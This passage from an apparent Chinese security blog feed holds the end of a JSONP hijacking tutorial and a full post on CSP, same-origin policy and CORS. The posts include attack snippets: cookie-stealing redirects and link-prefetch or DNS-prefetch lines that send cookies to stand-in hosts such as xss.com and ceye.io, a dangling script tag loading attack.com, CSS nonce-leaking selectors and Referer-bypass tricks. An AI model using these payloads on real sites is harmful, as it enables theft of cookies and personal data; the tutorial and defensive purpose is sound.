title="漏洞危害及利用方式"></a>漏洞危害及利用方式</h2><p><strong>获取用户的敏感信息</strong><br><code>JSONP是一种敏感信息泄露的漏洞</code>，经过攻击者巧妙而持久地利用，会对企业和用户造成巨大的危害。攻击者通过巧妙设计一个网站，<code>网站中包含其他网站的JSONP漏洞利用代码</code>，将链接通过邮件等形式推送给受害人，<code>如果受害者点击了链接，则攻击者便可以获取受害者的个人的信息</code>，如邮箱、姓名、手机等信息，这些信息可以被违法犯罪分子用作“精准诈骗”。对方掌握的个人信息越多，越容易取得受害人的信任，诈骗活动越容易成功，给受害人带来的财产损失以及社会危害也就越大。</p><h3 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h3><p><strong>（一）利用过程</strong><br>1、用户在网站B 注册并登录，网站B 包含了用户的id，name，email等信息；<br>2、用户通过浏览器向网站A发出URL请求；<br>3、网站A向用户返回响应页面，响应页面中注册了JavaScript的回调函数和向网站B请求的script标签，示例代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function Callback(result)</span><br><span class="line">&#123;</span><br><span class="line">    alert(result.name);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://B.com/user?jsonp=Callback&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>3、用户收到响应，解析JS代码，将回调函数作为参数向网站B发出请求；<br>4、网站B接收到请求后，解析请求的URL，以JSON 格式生成请求需要的数据，将封装的包含用户信息的JSON数据作为回调函数的参数返回给浏览器，网站B返回的数据实例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Callback(&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;test&quot;,&quot;email&quot;:&quot;test@test.com&quot;&#125;)</span><br></pre></td></tr></table></figure><p>5、网站B数据返回后，浏览器则自动执行Callback函数对步骤4返回的JSON格式数据进行处理，通过alert弹窗展示了用户在网站B的注册信息。另外也可将JSON数据回传到网站A的服务器，这样网站A利用网站B的JSONP漏洞便获取到了用户在网站B注册的信息。</p><p><strong>（二）自动化测试工具Selenium + Proxy + 验证脚本</strong></p><p>(1)Selenium：可用于自动化对网页进行测试，“到处”点击按钮、超链接，以期待测试更多的接口；<br>(2)Proxy：用于代理所有的请求，过滤出所有包含敏感信息的JSONP请求，并记录下HTTP请求；<br>(3)验证脚本：使用上述的HTTP请求，剔除referer字段，再次发出请求，测试返回结果中，是否仍包敏感信息，如果有敏感信息，说明这个接口就是我们要找的！</p><p>jsonp_info_leak：<a href="https://github.com/qiaofei32/jsonp_info_leak">https://github.com/qiaofei32/jsonp_info_leak</a></p><p><strong>（三）结合其他漏洞来进行拓展攻击</strong>：<br>1、JSONP 跨域劫持<br>实际上就是由于服务器端对JSONP 的请求来源的检查不严格导致的<br>攻击者模拟用户向有漏洞的服务器发送JSONP请求，然后就获取到了用户的某些信息，再将这些信息发送到攻击者可控的服务器</p><p>2、JSONP 跨域劫持token 实现CSRF<br>通过 jsonp 发起请求，得到泄露的 csrf_token 然后，利用这个token 实现CSRF 攻击</p><p><strong>（四）Referer头绕过</strong><br>1、data:URL<br>使用data URI来构造一个不带HTTP Referer的请求，来绕过检测<br>因为正在处理的代码包含了引号，双引号，以及其他一些被阻止的语句，接着使用base64编码我们的payload（回调函数定义以及脚本包含）<br><code>data:text/plain;base64our_base64_encoded_code:</code></p><p>以下3个HTML标签允许我们使用data URI方案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iframe (在src属性中) – Internet Explorer下不工作</span><br><span class="line">embed (在src属性中) – Internet Explorer及Microsoft Edge下不工作</span><br><span class="line">object (在data属性中) – Internet Explorer及Microsoft Edge下不工作</span><br></pre></td></tr></table></figure><p>2、从HTTPS向HTTP发起请求<br>如果目标网站可以通过HTTP访问，也可以通过将代码托管在一个HTTPS页面来避免发送HTTP Referer。如果从HTTPS页面发起一个HTTP请求，浏览器为了防止信息泄漏是不会发送Referer header。以上我们要将恶意代码托管在一个启用了HTTPS的站点。<br>注意：由于mixed-content安全机制，在浏览器默认设置下是不会工作的。需要受害者手动允许浏览器发出的安全警告。</p><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>人工测试：<br>在浏览器中查找一些关键词，如： <code>callback json jsonp email</code><br>常见的关键词如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cb</span><br><span class="line">callback</span><br><span class="line">jsoncb</span><br><span class="line">jsonp</span><br><span class="line">jQuery</span><br><span class="line">jsoncallback</span><br><span class="line">jsonpcallback</span><br><span class="line">jsoncall</span><br><span class="line">jsonpcall</span><br></pre></td></tr></table></figure><p>注：<br>浏览器中，首先把Preserve log选项勾上，防止页面刷新跳转的时候访问记录被重置，也方便进行下一步的筛选。</p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>防御策略就是检查referer头是否在白名单内。</p><p>1、严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等。<br>2、严格安装 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application&#x2F;json; charset&#x3D;utf-8 ）。<br>3、严格过滤 callback 函数名及 JSON 里数据的输出。<br>4、严格限制对 JSONP 输出 callback 函数名的长度(如防御上面 flash 输出的方法)。<br>5、其他一些比较“猥琐”的方法：如在 Callback 输出之前加入其他字符(如：&#x2F;**&#x2F;、回车换行)这样不影响 JSON 文件加载，又能一定程度预防其他文件格式的输出。还比如 Gmail 早起使用 AJAX 的方式获取 JSON ，听过在输出 JSON 之前加入 while(1) ;这样的代码来防止 JS 远程调用。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/">K0rz3n师傅的博客</a><br><a href="https://zhuanlan.zhihu.com/p/149187997">Jsonp漏洞简析及自动化漏洞挖掘脚本编写</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&quot;&gt;漏洞原理&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3%E5%8</summary>
      
    
    
    
    
    <category term="漏洞" scheme="https://yinwc.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>CSP、同源策略与跨域请求(JSONP/CORS)</title>
    <link href="https://yinwc.github.io/2021/03/15/CSP%E4%B8%8E%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"/>
    <id>https://yinwc.github.io/2021/03/15/CSP%E4%B8%8E%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</id>
    <published>2021-03-15T02:57:04.000Z</published>
    <updated>2023-03-02T02:23:40.131Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#csp">CSP</a><ul><li><a href="#csp%E7%AE%80%E4%BB%8B">CSP简介</a><ul><li><a href="#%E5%8E%9F%E7%90%86">原理</a></li><li><a href="#%E5%90%AF%E7%94%A8">启用</a></li></ul></li><li><a href="#csp%E7%9A%84%E8%BF%9B%E5%8C%96nonce-script-csp%E5%92%8Cstrict-dynamic">CSP的进化–nonce script CSP和strict-dynamic</a><ul><li><a href="#nonce-script-csp">nonce script CSP</a></li><li><a href="#strict-dynamic">strict-dynamic</a></li></ul></li><li><a href="#csp-bypass%E7%9A%84%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93">CSP Bypass的方法总结</a><ul><li><a href="#url%E8%B7%B3%E8%BD%AC">url跳转</a></li><li><a href="#%5Clink%E6%A0%87%E7%AD%BE%E9%A2%84%E5%8A%A0%E8%BD%BD">&lt;link&gt;标签预加载</a></li><li><a href="#%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A1%A5%E5%85%A8">利用浏览器补全</a></li><li><a href="#%E5%88%A9%E7%94%A8dom-xss">利用DOM XSS</a></li><li><a href="#%E5%88%A9%E7%94%A8css-%E9%9D%99%E6%80%81xss-%E8%8E%B7%E5%8F%96nonce%E5%80%BC">利用CSS 静态xss 获取nonce值</a></li><li><a href="#%E5%88%A9%E7%94%A8%E8%B7%A8%E5%9F%9F%E4%BC%A0%E8%BE%93%E6%95%B0%E6%8D%AE">利用跨域传输数据</a></li><li><a href="#%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%89%A7%E8%A1%8Cjs">利用文件上传执行JS</a></li><li><a href="#base%E6%A0%87%E7%AD%BE">base标签</a></li></ul></li></ul></li><li><a href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5sop">同源策略SOP</a><ul><li><a href="#%E5%9F%BA%E7%A1%80">基础</a></li><li><a href="#%E8%A7%84%E9%81%BF%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5">规避同源策略</a><ul><li><a href="#jsonp">JSONP</a></li><li><a href="#cors">CORS</a></li><li><a href="#websocket">WebSocket</a><ul><li><a href="#cors%E4%B8%8Ejsonp%E7%9A%84%E6%AF%94%E8%BE%83">CORS与JSONP的比较</a></li></ul></li></ul></li></ul></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><h3 id="CSP简介"><a href="#CSP简介" class="headerlink" title="CSP简介"></a>CSP简介</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><ul><li>CSP（Content-Security-Policy）内容安全策略,用来防御XSS攻击的技术。CSP是一种白名单策略，通过CSP指定可信的内容来源，让WEB处于一个安全的运行环境中。</li><li>CSP的实质就是白名单策略，预先设定好哪些资源能被加载执行而哪些不能。除了普通的CSP还有个<code>CSPRO</code>(Content-Security-Policy-Report-Only)，区别是后者不限制执行，而是记录违反限制的行为，需要与<code>report-uri</code>一起使用。</li></ul><h4 id="启用"><a href="#启用" class="headerlink" title="启用"></a>启用</h4><ul><li>通过 HTTP 头信息的Content-Security-Policy的字段</li><li>通过网页的<code>&lt;meta</code>&gt;标签<ul><li><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;self&#39;&quot;&gt;</code></li></ul></li><li>常规配置：该策略允许加载同源的图片、脚本、AJAX和CSS资源，并阻止加载其他任何资源，对于大多数网站是一个不错的配置。<ul><li><code>default-src ‘none’; script-src ‘self’; connect-src ‘self’; img-src ‘self’; style-src ‘self’;</code></li></ul></li></ul><ol><li>一个CSP头由多组CSP策略组成，中间由分号分隔,如下所示：<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Security</span>-<span class="title class_">Policy</span>: <span class="keyword">default</span>-src <span class="string">&#x27;self&#x27;</span> www.<span class="property">baidu</span>.<span class="property">com</span>; script-src <span class="string">&#x27;unsafe-inline&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><ul><li><p>其中每一组策略包含一个策略指令和一个内容源列表。策略指令有如下选项：</p><table><thead><tr><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>default-src</td><td>定义资源默认加载策略</td></tr><tr><td>connect-src</td><td>定义 Ajax、WebSocket 等加载策略</td></tr><tr><td>font-src</td><td>定义 Font 加载策略</td></tr><tr><td>frame-src</td><td>定义 Frame 加载策略</td></tr><tr><td>img-src</td><td>定义图片加载策略</td></tr><tr><td>media-src</td><td>定义 &lt;audio&gt;、&lt;video&gt; 等引用资源加载策略</td></tr><tr><td>object-src</td><td>定义 &lt;applet&gt;、&lt;embed&gt;、&lt;object&gt; 等引用资源加载策略</td></tr><tr><td>script-src</td><td>定义 JS 加载策略</td></tr><tr><td>style-src</td><td>定义 CSS 加载策略</td></tr><tr><td>sandbox</td><td>值为 allow-forms，对资源启用 sandbox</td></tr><tr><td>report-uri</td><td>值为 &#x2F;report-uri，提交日志</td></tr></tbody></table></li><li><p>内容源有如下选项：</p><table><thead><tr><th>源</th><th>说明</th></tr></thead><tbody><tr><td>*</td><td>通配符，允许任何URL，除了data: blob: filesystem: schemes</td></tr><tr><td>*.<a href="http://foo.com/">foo.com</a></td><td>允许加载<a href="http://foo.com/">foo.com</a>子域的资源</td></tr><tr><td><a href="http://abc.foo.com/">abc.foo.com</a></td><td>只能加载这个域名下的资源</td></tr><tr><td><a href="https://a.com/">https://a.com</a></td><td>只能用HTTPS加载域名下的资源</td></tr><tr><td>https:</td><td>通过HTTPS可以加载任意域名下的资源</td></tr><tr><td>‘none’</td><td>代表空集,即不匹配任何URL,两侧单引号是必须的</td></tr><tr><td>‘self’</td><td>代表和文档同源,包括相同的URL协议和端口号,两侧单引号是必须的</td></tr><tr><td>‘unsafe-inline’</td><td>允许使用内联资源,如内联的&lt;script&gt;元素、javascript: URL、内联的事件处理函数和内联的&lt;style&gt;元素,两侧单引号是必须的</td></tr><tr><td>‘unsafe-eval’</td><td>允许使用 eval() 等通过字符串创建代码的方法,两侧单引号是必须的</td></tr><tr><td>data:</td><td>允许data: URI作为内容来源</td></tr><tr><td>mediastream:</td><td>允许mediastream: URI作为内容来源</td></tr></tbody></table><ul><li><p>例子1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27; trustedscripts.foo.com</span><br></pre></td></tr></table></figure><p>意思就是默认的内容源必须为同源或者是 <a href="http://trustedscripts.foo.com/">trustedscripts.foo.com</a></p><p>例子2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; img-src &#x27;self&#x27; data:; media-src mediastream:</span><br></pre></td></tr></table></figure><p>图片源可以为同源内容或者是data:引用的资源，媒体源必须使用mediastream:引用，除此以外的都执行默认内容源判断，必须为同源内容。更加详细的可以看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2016/08/08/ccsp/</span><br></pre></td></tr></table></figure><p>一个在线的CSP头部生成器可以帮助我们深入理解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cspisawesome.com</span><br></pre></td></tr></table></figure><p>一个CSP安全检测网站，能够提供一些参考</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://csp-evaluator.withgoogle.com/</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="CSP的进化–nonce-script-CSP和strict-dynamic"><a href="#CSP的进化–nonce-script-CSP和strict-dynamic" class="headerlink" title="CSP的进化–nonce script CSP和strict-dynamic"></a>CSP的进化–nonce script CSP和strict-dynamic</h3><p>这是Google团队2016年在<a href="https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/45542.pdf">CSP is Dead, Long live CSP</a>中正式提出的CSP种类，为了解决CSP爆出的各种各样的问题。</p><h4 id="nonce-script-CSP"><a href="#nonce-script-CSP" class="headerlink" title="nonce script CSP"></a>nonce script CSP</h4><p>动态生成nonce字符串，只有包含nonce字段并字符串相等的script块可以被执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Security-Policy: script-src &#x27;nonce-&quot;</span>.<span class="variable">$random</span>.<span class="string">&quot; &#x27;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;script nonce=<span class="string">&quot;&lt;?php echo <span class="subst">$random</span>?&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>这个字符串可以在后端实现，每次请求都重新生成，这样就可以无视哪个域是可信的，保证所加载的任何资源都是可信的，并且还能拦截后面插入的script。</p><h4 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;strict-dynamic&#x27;</span><br></pre></td></tr></table></figure><p><code>strict-dynamic</code>意味着可信js,生成的js代码是可信的。</p><p>这个CSP规则主要是用来适应各种各样的现代前端框架，通过这个规则，可以大幅度避免因为适应框架而变得松散的CSP规则。</p><h3 id="CSP-Bypass的方法总结"><a href="#CSP-Bypass的方法总结" class="headerlink" title="CSP Bypass的方法总结"></a>CSP Bypass的方法总结</h3><p>CSP对前端攻击的防御主要有两个：</p><ol><li>限制js的执行。</li><li>限制对不可信域的请求。</li></ol><p>接下来的多种Bypass手段也是围绕这两种的</p><h4 id="url跳转"><a href="#url跳转" class="headerlink" title="url跳转"></a>url跳转</h4><p>利用url跳转，回避严格的CSP。</p><p>在default-src ‘none’的情况下，可以使用meta标签实现跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://www.xss.com/x.php?c=[cookie]&quot; &gt;</span><br></pre></td></tr></table></figure><p>在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  window.location=&quot;http://www.xss.com/x.php?c=[cookie]&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&lt;a&gt;标签配合站内的某些可控JS点击操作来跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  $(#foo).click()</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;a id=&quot;foo&quot; href=&quot;xxxxx.com&quot;&gt;</span><br></pre></td></tr></table></figure><p>利用网站本身的跳转接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://foo.com/jmp.php?url=attack.com</span><br></pre></td></tr></table></figure><h4 id="lt-link-gt-标签预加载"><a href="#lt-link-gt-标签预加载" class="headerlink" title="&lt;link&gt;标签预加载"></a>&lt;link&gt;标签预加载</h4><p>CSP对link标签的预加载功能考虑不完善。在Chrome下，可以使用如下标签发送cookie或者其他数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;http://www.xss.com/x.php?c=[cookie]&quot;&gt;</span><br></pre></td></tr></table></figure><p>在Firefox下无法用prefetch，因为Firefox有更高的安全规范，但是我们可以使用其他的方式，比如dns-prefetch，将cookie作为子域名，用dns预解析的方式把cookie带出去，查看dns服务器的日志就能得到cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//[cookie].xxx.ceye.io&quot;&gt;</span><br></pre></td></tr></table></figure><p>link标签除了这两种rel，还有preconnect、prerender、subresource、preload等</p><h4 id="利用浏览器补全"><a href="#利用浏览器补全" class="headerlink" title="利用浏览器补全"></a>利用浏览器补全</h4><p>有些网站限制只有某些脚本才能使用，往往会使用&lt;script&gt;标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;none&#x27;;script-src &#x27;nonce-abc&#x27;</span><br></pre></td></tr></table></figure><p>那么当脚本插入点为如下的情况时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;插入点&lt;/p&gt;</span><br><span class="line">&lt;script nonce=&quot;abc&quot;&gt;document.write(&#x27;CSP&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可以插入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=//attack.com a=&quot;</span><br></pre></td></tr></table></figure><p>这里利用浏览器的容错机制会拼成一个新的script标签，其中的src可以自由设定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;script src=//attack.com a=&quot;&lt;/p&gt;</span><br><span class="line">&lt;script&quot; nonce=&quot;abc&quot;&gt;document.write(&#x27;CSP&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="利用DOM-XSS"><a href="#利用DOM-XSS" class="headerlink" title="利用DOM XSS"></a>利用DOM XSS</h4><p>如果JS存在操作location.hash导致的XSS，那么这样的攻击请求不会经过后台，那么nonce后的随机值就不会刷新。可以见下面lorexxar师傅的博文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2017/05/16/nonce-bypass-script/</span><br></pre></td></tr></table></figure><p>如果有DOM操作可以插入HTML并且可以控制插入的HTML内容，那么也可以绕过CSP</p><h4 id="利用CSS-静态xss-获取nonce值"><a href="#利用CSS-静态xss-获取nonce值" class="headerlink" title="利用CSS 静态xss 获取nonce值"></a>利用CSS 静态xss 获取nonce值</h4><p>利用CSS选择器来逐字节获取信息，<code>^=</code>从头部判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*[attribute^=&quot;a&quot;]&#123;background:url(&quot;record?match=a&quot;)&#125;</span><br><span class="line">*[attribute^=&quot;b&quot;]&#123;background:url(&quot;record?match=b&quot;)&#125;</span><br><span class="line">*[attribute^=&quot;c&quot;]&#123;background:url(&quot;record?match=c&quot;)&#125;</span><br></pre></td></tr></table></figure><p>比如确定第一位为c，那么就会继续下面的步骤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*[attribute^=&quot;ca&quot;]&#123;background:url(&quot;record?match=ca&quot;)&#125;</span><br><span class="line">*[attribute^=&quot;cb&quot;]&#123;background:url(&quot;record?match=cb&quot;)&#125;</span><br><span class="line">*[attribute^=&quot;cc&quot;]&#123;background:url(&quot;record?match=cc&quot;)&#125;</span><br></pre></td></tr></table></figure><p>由于是CSS的变化，没有引起服务器重新请求，所以nonce的值不会改变，偷取值后即可执行我们的script</p><h4 id="利用跨域传输数据"><a href="#利用跨域传输数据" class="headerlink" title="利用跨域传输数据"></a>利用跨域传输数据</h4><p>利用一些跨域传输的方法来引入JS，导致执行</p><p>具体的可以看看呆子不开口的乌云大会PPT</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pan.baidu.com/s/1pLCfCWr</span><br></pre></td></tr></table></figure><p>和0CTF2018预选赛中的h4xors.club2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2018/04/10/0ctf2018-club2/</span><br></pre></td></tr></table></figure><h4 id="利用文件上传执行JS"><a href="#利用文件上传执行JS" class="headerlink" title="利用文件上传执行JS"></a>利用文件上传执行JS</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure><p>针对只能加载同域下script的CSP策略，如果有上传点可以控制，那么可以在其中夹杂js代码，然后引用该文件完成执行。</p><p>可以参考前几天梅子酒师傅写的上传Wave文件绕过CSP，执行JS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/ljBB5jStB7fcJq4cgdWnnw</span><br></pre></td></tr></table></figure><h4 id="base标签"><a href="#base标签" class="headerlink" title="base标签"></a>base标签</h4><p>利用base标签改变资源加载的域，从而引入恶意的js，造成js执行。</p><h2 id="同源策略-SOP"><a href="#同源策略-SOP" class="headerlink" title="同源策略(SOP)"></a>同源策略(SOP)</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>SOP(Same-Origin-Policy)同源策略是浏览器的一个安全限制，它阻止了不同域之间进行的数据交互，A 网页设置的 Cookie，B 网页不能打开，除非这两个网页同源，所谓同源，是指：协议（protocol）、端口（port）、和主机（host）都相同，如果非同源，Cookie，LocalStorage，IndexDB 无法读取：</p><ol><li><p>LocalStorage</p><blockquote><p>LocalStorage 是 HTML5 本地存储 Web Storage 特性的 API 之一，用于将大量数据（最大 5 M）保存在浏览器中，保存后数据永远存在不会失效过期，除非用 Js 手动清除，它不参与网络传输，一般用于性能优化，可以保存图片、Js、CSS、HTML 模板、大量数据，IndexDB 也是用于储存的东西。</p></blockquote></li><li><p>DOM 无法获取</p><blockquote><p>DOM（Document Object Model）译为文档对象模型，是 HTML 和 XML 文档的编程接口，HTML DOM 定义了访问和操作 HTML 文档的标准方法，DOM 以树结构表达 HTML 文档。</p></blockquote></li><li><p>AJAX 请求不能发送</p><blockquote><p>AJAX &#x3D; Asynchronous JavaScript and XML（异步的 JavaScript 和 XML）。 AJAX 不是新的编程语言，而是一种使用现有标准的新方法。 AJAX 最大的优点是在不重新加载整个页面的情况下，可以与服务器交换数据并更新部分网页内容，AJAX 请求只能发给同源的网址。</p></blockquote></li></ol><h3 id="规避同源策略"><a href="#规避同源策略" class="headerlink" title="规避同源策略"></a>规避同源策略</h3><p>主要有以下三种方法规避同源策略的限制：<code>JSONP</code>，<code>WebSocket</code>，<code>CORS</code></p><h4 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h4><ul><li><a href="https://yinwc.github.io/2021/04/30/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JSONP%E6%BC%8F%E6%B4%9E/">深入理解JSONP漏洞</a></li><li>JSONP是JSON with padding（填充式JSON或参数式JSON）的简写。是为了解决跨域资源请求而产生的一种解决方案，动态创建<code>&lt;script&gt;</code>标签，然后利用<code>&lt;script&gt;</code>的<code>src</code>标签不受同源策略约束来跨域获取数据。</li></ul><h4 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h4><p>CORS是跨域资源共享<code>（Cross-Origin Resource Sharing）</code>的缩写，它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了 AJAX 只能同源使用的限制，它是W3C标准，是跨源 AJAX 请求的根本解决方法.</p><ul><li>CORS请求大致和ajax请求类似，但是在 HTTP 头信息中加上了 Origin 字段表明请求来自哪个源，如果orgin是许可范围之内的话，服务器返回的响应会多出<code>Access-Control-Allow-*</code>的字段。</li></ul><h4 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h4><p>WebSocket是一种通信协议，使用<code>ws://</code>（非加密）和<code>wss://</code>（加密）作为协议前缀，该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信，为什么不实行同源策略？</p><ul><li>原因是WebSocket请求的头信息中有一个字段是Origin，表示该请求的请求源（origin），即发自哪个域名，正是因为有了Origin这个字段，所以WebSocket才没有实行同源政策，因为服务器可以根据这个字段，判断是否许可本次通信</li></ul><h5 id="CORS与JSONP的比较"><a href="#CORS与JSONP的比较" class="headerlink" title="CORS与JSONP的比较"></a>CORS与JSONP的比较</h5><p>CORS与JSONP的使用目的相同，但是比JSONP更强大，JSONP只支持 GET 请求，CORS支持所有类型的 HTTP 请求，JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://hurricane618.me/2018/06/30/csp-bypass-summary/">CSP绕过总结</a></li><li><a href="https://www.cnblogs.com/both-eyes/p/10841875.html">内容安全策略（CSP）详解</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
